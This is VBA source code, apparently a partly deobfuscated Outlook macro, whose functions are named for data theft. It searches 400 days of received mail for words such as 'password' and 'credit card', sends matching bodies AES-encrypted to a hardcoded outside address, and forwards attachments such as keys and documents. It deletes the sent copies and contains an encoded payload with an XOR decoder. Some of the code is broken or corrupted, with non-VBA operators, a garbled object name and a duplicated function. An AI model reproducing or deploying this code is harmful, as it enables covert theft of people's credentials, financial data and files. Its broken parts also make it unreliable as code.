Const exfil_address As String = "dph@whschool.com"
Private list_set       As Boolean
Private byte_arr_0_to_63(0 To 63) As Byte
Private byte_arr_0_to_127(0 To 127) As Byte 'bytes
Function generate_random_string(max_range)
    Dim array_of_alpha As Variant
    Dim IsNslKdUSos As Long
    Dim random_string As String
    array_of_alpha = Array("a","b", "c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z")
    For IsNslKdUSos = 1 To max_range
        Randomize
        random_string = random_string & array_of_alpha(Int((length(array_of_alpha) -  1) * Rnd))
    Next IsNslKdUSos
    generate_random_string = random_string
End Function
Function compare_ret_smallest(arg0, arg1)
    compare_ret_smallest = arg0
    If arg1 < arg0 Then compare_ret_smallest = arg1
End Function
Function base64_encode(arg0)
    Dim return_string As String
    Dim b64_string() As Byte
    Dim PIBNxhGCNMURDD As Object
    Dim utf8_enc As Object
    Dim index, smaller_num As Integer
    Set to_b64 = CreateObject("System.Security.Cryptography.ToBase64Transform")
    Set utf8_enc = CreateObject("System.Text.UTF8Encoding")
    For index = 0 To length(arg0) - 1 Step to_b64.InputBlockSize
        smaller_num = compare_ret_smallest(to_b64.InputBlockSize, length(arg0) - index)
        b64_string = to_b64.TransformFinalBlock(arg0, index, smaller_num)
        return_string = return_string & utf8_enc.GetString(b64_string)
    Next
    base64_encode = return_string
End Function
Function base64_decode(arg0)
    Dim utf8_enc As Object
    Dim encoded_arg0() As Byte
    Dim from_base64  As Object
    Set utf8_enc = CreateObject( "System.Text.UTF8Encoding" )
    Set from_base64 = CreateObject( "System.Security.Cryptography.FromBase64Transform")
    encoded_arg0 = utf8_enc.GetBytes_4(arg0)
    base64_decode = from_base64.TransformFinalBlock((encoded_arg0), 0, length(encoded_arg0))
End Function
Function encrypt_CBC(arg0)
    Dim encrypted_text As Byte
    Dim IV  As String
    IV = generate_random_string(32)
    Dim utf8_enc, igFwXpLeArakc, zrjycZwtKFJvAu, IVdDfkxSWPOTi As Object
    Dim kSNpGaWBeFRbpl() As Byte
    Set rijndael_man = CreateObject("System.Security.Cryptography.RijndaelManaged")
    Set utf8_enc = CreateObject("System.Text.UTF8Encoding")
    rijndael_man.KeySize = 256
    rijndael_man.QrbstMncnU = 256
    rijndael_man.mode = 1 'CBC
    rijndael_man.Key = CreateObject("System.Text.UTF8Encoding").GetBytes_4("8xppg2oX68Bo6koL7hwSeC8bCEWvk540")
    rijndael_man.IV = CreateObject("System.Text.UTF8Encoding").GetBytes_4(IV)
    encoded_arg0 = CreateObject("System.Text.UTF8Encoding").GetBytes_4(arg0)
    encrypted_text = rijndael_man.CreateEncryptor().TransformFinalBlock((encoded_arg0), 0, length(encoded_arg0))
    encrypt_CBC = IV & "|" & base64_encode(encrypted_text)
End Function
Sub main()
    Dim senstive_info
    senstive_info = Array( "password","passwd", "creds", "credential", "credit card" ,  "creditcard" , "social security number")
    Dim senstive_extensions
    senstive_extensions = Array( "pgp", "asc", "pem", "pub", "gpg", "gpg-key", "mp3", "mp4", "mov", "xlsx", "xlsm", "ylsb", "csv", "doc", "docx", "docm", "exe", "zip", "YæÓ", "db", "bak", "pdf" )
    Dim outlook_app As Object
    Dim XstsppFkvZr As Object
    Dim emDROsRKEd  As String
    Dim app_namespace_MAPI As Object
    Dim default_folder_items As Object
    Set outlook_app = CreateObject("Outlook.Application")
    Set app_namespace_MAPI = outlook_app.GetNamespace("MAPI")
    Set default_folder_items = app_namespace_MAPI.GetDefaultFolder(6).Items
    Dim counter As Integer
    Dim is_senstive_info As Boolean
    is_senstive_info = FALSE
    Dim jUBrimEvzM  As Boolean
    jUBrimEvzM = FALSE
    Dim begin_dates As Date
    Dim end_dates As Date
    Const daysToSearch As Integer = 400
    begin_dates = Date - daysToSearch
    end_dates = Date
    Dim email  As Object
    For Each email In default_folder_items
        If email.ReceivedTime >= begin_dates And email.ReceivedTime <= end_dates Then
            is_senstive_info = checks_for_senstive_info(email.body, email.Subject, senstive_info)
            If is_senstive_info Then
                Call send_email(email.body, email.Subject)
            End If
            If email.Attachments.Count > ((0) + 0) Then
                Dim xZLUISSiXEpR As Integer
                For xZLUISSiXEpR = 1 To email.Attachments.Count
                    jUBrimEvzM = mvieYItXUPBIvj(email.Attachments.Item(xZLUISSiXEpR), senstive_extensions, whDjrLULSB)
                    If jUBrimEvzM Then
                        Call RkrRzFVxFXd(email, email.Subject)
                    End If
                Next
            End If
        End If
    Next
    Set XstsppFkvZr = Nothing
    Set outlook_app = Nothing
End Sub
Sub send_email(body As String, Subject As String)
    Dim outlookApp As Object
    Dim outlookItem As Object
    Set outlookApp = CreateObject("Outlook.ApplicĽtion")
    Set outlookItem = outlookApp.CreateItem(0)
    On Error Resume Next
    With outlookItem
        .To = exfil_address
        .CC = ""
        .BCC = ""
        .Subject = "Outlook Exfiltration Data from User:"  & Environ("username")
        .body = encrypt_CBC(Subject & body)
        .DeleteAfterSubmit = TRUE
        .Send
    End With
    On Error GoTo 0
    Set outlookItem = Nothing
    Set outlookApp = Nothing
End Sub
Sub RkrRzFVxFXd(QmmdKXwuMa As Variant, gjQiIlwvaI As String)
    Dim XstsppFkvZr As Object
    Set XstsppFkvZr = QmmdKXwuMa.Forward
    On Error Resume Next
    With XstsppFkvZr
        .To = exfil_address
        .CC = ""
        .BCC = ""
        .Subject = "Outlook Exfiltration Attachment from User:" & Environ("username")
        .DeleteAfterSubmit = TRUE
        .Send
    End With
    On Error GoTo 0
    Set XstsppFkvZr = Nothing
End Sub
Public Function checks_for_senstive_info(arg0 As String, arg1 As String, senstive_info As Variant) As Boolean
    checks_for_senstive_info = FALSE
    Dim info As Variant
    For Each info In senstive_info
        If (InStr(1, UCase(arg0), info, vbTextCompare) > (0)) Or (InStr(1, UCase(arg1), info, vbTextCompare) > (0)) Then
            checks_for_senstive_info = TRUE
            Exit For
        Else
            checks_for_senstive_info = FALSE
        End If
    Next
End Function
Public Function mvieYItXUPBIvj(OFTngrKtymtIs As Variant, RQRaVHWlfs As Variant, whDjrLULSB As Variant) As Boolean
    mvieYItXUPBIvj = FALSE
    Dim sBtphCWmicZ As Boolean
    sBtphCWmicZ = FALSE
    Dim FSvAGmBKEpy As Boolean
    FSvAGmBKEpy = FALSE
    Dim KfBAtqXWVPbl As String
    Dim tFWjedYCFp  As String
    KfBAtqXWVPbl = OFTngrKtymtIs.FileName
    tFWjedYCFp = Split(KfBAtqXWVPbl, ".")(1)
    Dim dPjnuzlcUPVn As Variant
    For Each dPjnuzlcUPVn In RQRaVHWlfs
        If (InStr(1, UCase(tFWjedYCFp), dPjnuzlcUPVn, vbTextCompare) > 0) Then
            sBtphCWmicZ = TRUE
        Else
            sBtphCWmicZ = FALSE
        End If
    Next
    Dim YXeXnGWwCIuAtn As Variant
    For Each YXeXnGWwCIuAtn In whDjrLULSB
        If (InStr(1, UCase(KfBAtqXWVPbl), YXeXnGWwCIuAtn, vbTextCompare) > (0)) Then
            FSvAGmBKEpy = TRUE
        Else
            FSvAGmBKEpy = FALSE
        End If
    Next
    If sBtphCWmicZ Or FSvAGmBKEpy Then
        mvieYItXUPBIvj = TRUE
    Else
        mvieYItXUPBIvj = FALSE
    End If
End Function
' Guess: base64 decode
Public Function base64_decode(ByVal inp_string As String) As Byte()
    If Not list_set Then fills_string_list 'if not true then executes fills_string_list
    Dim array_str_to_mid() As Byte: array_str_to_mid = ret_0_to_mid(inp_string)
    Dim len_of_list As Long: len_of_list = length(array_str_to_mid) + 1
    If len_of_list % 4 != 0 Then Err.Raise vbObjectError, , ""
    Do While len_of_list > 0
        ' checks the last byte of the array
        If array_str_to_mid(len_of_list - 1) != Asc("=") Then Exit Do
        len_of_list = len_of_list - 1
    Loop
    Dim len_of_list_x3_dd4 As Long: len_of_list_x3_dd4 = (len_of_list * 3) // 4
    Dim the_return_array() As Byte
    ReDim the_return_array(0 To len_of_list_x3_dd4 - 1) As Byte
    Dim counter  As Long
    Dim j As Long
    Do While counter < len_of_list
        Dim var_1 As Byte: var_1 = array_str_to_mid(counter): counter = counter + 1
        Dim var_2 As Byte: var_2 = array_str_to_mid(counter): counter = counter + 1
        Dim var_3 As Byte: If counter < len_of_list Then var_3 = array_str_to_mid(counter): counter = counter + 1 Else var_3 = Asc("A")
        Dim var_4 As Byte: If counter < len_of_list Then var_4 = array_str_to_mid(counter): counter = counter + 1 Else var_4 = Asc("A")
        If var_1 > 127 Or var_2 > 127 Or var_3 > 127 Or var_4 > 127 Then _ Err.Raise vbObjectError, , ""
        ' translate int to ascii
        Dim char_1 As Byte: char_1 = byte_arr_0_to_127(var_1)
        Dim char_2 As Byte: char_2 = byte_arr_0_to_127(var_2)
        Dim char_3 As Byte: char_3 = byte_arr_0_to_127(var_3)
        Dim char_4 As Byte: char_4 = byte_arr_0_to_127(var_4)
        If char_1 > 63 Or char_2 > 63 Or char_3 > 63 Or char_4 > 63 Then _ Err.Raise vbObjectError, , ""
        Dim val_1 As Byte: val_1 = (char_1 * 4) | (char_2 // 16)
        Dim val_2 As Byte: val_2 = ((char_2 & 15) * 16) | (char_3 // 4)
        Dim val_3 As Byte: val_3 = ((char_3 & 3) * 64) | char_4
        the_return_array(j) = val_1: j = j + 1
        If j < len_of_list_x3_dd4 Then the_return_array(j) = val_2: j = j + 1
        If j < len_of_list_x3_dd4 Then the_return_array(j) = val_3: j = j + 1
    Loop
    base64_decode = the_return_array
End Function
Private Sub fills_string_list()
    Dim i  As Integer, counter As Integer
    counter = 0
    For i = Asc("A") To Asc("Z"): byte_arr_0_to_63(counter) = i: counter = counter + 1: Next
        For i = Asc("a") To Asc("z"): byte_arr_0_to_63(counter) = i: counter = counter + 1: Next
            For i = Asc("0") To Asc("9"): byte_arr_0_to_63(counter) = i: counter = counter + 1: Next
                byte_arr_0_to_63(counter) = Asc("+"): counter = counter + 1
                byte_arr_0_to_63(counter) = Asc("/"): counter = counter + 1
                For counter = (0) To (127): byte_arr_0_to_127(counter) = (255): Next
                    For counter = (0) To (63): byte_arr_0_to_127(byte_arr_0_to_63(counter)) = counter: Next
                        list_set = TRUE
                    End Sub
Private Function ret_0_to_mid(ByVal inp_string As String) As Byte()
    Dim inp_string_reassigned() As Byte: inp_string_reassigned = inp_string
    Dim mid_indx As Long: mid_indx = (length(inp_string_reassigned) + 1) \ 2 'gets middle value of inp string
    If mid_indx = 0 Then ret_0_to_mid = inp_string_reassigned: Exit Function 'return string as is
    Dim arr_0_to_mid() As Byte
    ReDim arr_0_to_mid(0 To mid_indx - 1) As Byte 
    Dim iterator As Long
    For iterator = 0 To mid_indx - 1
        Dim i As Long: i = inp_string_reassigned(2 * iterator) + (256 * CLng(inp_string_reassigned(2 * iterator + 1)))
        If i >= 256 Then i = 63
        arr_0_to_mid(iterator) = i
    Next
    ret_0_to_mid = arr_0_to_mid
End Function
Private Function importantFunc(in_array As Variant, offset As Integer)
    Dim final_string As String
    Dim byte_list() As Byte
    byte_list = base64_decode("eNS7GlezU9snp3ciGjUJ9HD0eo5arrhaNii/Jgh7Rq38gvvpitv8AHreIuCHDbXhLd1BlLceamykizs8G02DzoP5bZm0PWZkL80S8MfgzZKkTAWqU3oSdton381J023oFIgmK5mEI4c+F85DAOx+mOkrnEbqMaOzJ4EQ4lSM2LfCgqS7AXQDbwipi5KrDBRkfKO8Me3+6MQ5g/XK6b6e2W5HvaCGoWDe6P2crp90G3GTh0kAemmwX1OOhX1IaAeKe8GbBiyp++2WTalzSf1vCviI5a+jcyRw26L8DP6i4urW+YP902QZa43DZ6A+d8Zh438OogAeuuBaNXUgPEgPQpQaca+NDHco7sYPzmI4Fb1XJU9SS1xGw1gU06x8vZ2w6u8oqnQN/xxTvGjxXUV+X9fnxUGQsg64B85ekF+DPeJD/92LHqrK2wVSVYgHGqvwKY/Yshfu9t2fl74o7KDTFATUJa1AHmy9zsNuZPvvwbwG9iD1cHFJLnLemhWN+6vMoQiO/xUIYMWKGQk2D8+RiSvhlptUw2195E3e7K40WnXNLSyAMvW+ngfplr9T23xyapsNo8gz/MOdw0KWMB868kW9kAGQ5IXWPHGaE7H8hWB3t+1K5H861yr7u5BgZIUby3VU0gKV8EH2c0Gl7rCa6sFbiTtCXmV3r1A+Fm3vBMCG19X2YPN62VpHhRMobsfSEl5TezlLWYVA/HNP6G5VX8+sxdTdQOyk84SGtm8I5Ss6kL4bs/+zw/VdcaXr8IZSa5rsmSgRC4+mLHhPSBTZODowjHPJOZK++rnkqLWQTzIRiiRZZVXeSoVEIGSla44WBR7x2xJABJrRzCxKUg+ryslthKXjteBuF9JZZovMADo9uRVgtu7XYVahg9ujIR310KWMMKlr+rzsLAvvlMLPHGVrG8LDoHrbURxqjPlU3a5OppL//jZIRKGTHO353w8HNR/ly3P3Nw==")
    final_string = ""
    For i = 0 To length(in_array)
        final_string = final_string + Chr(byte_list(i + offset) ^ in_array(i))
    Next
    importantFunc = final_string
End Function
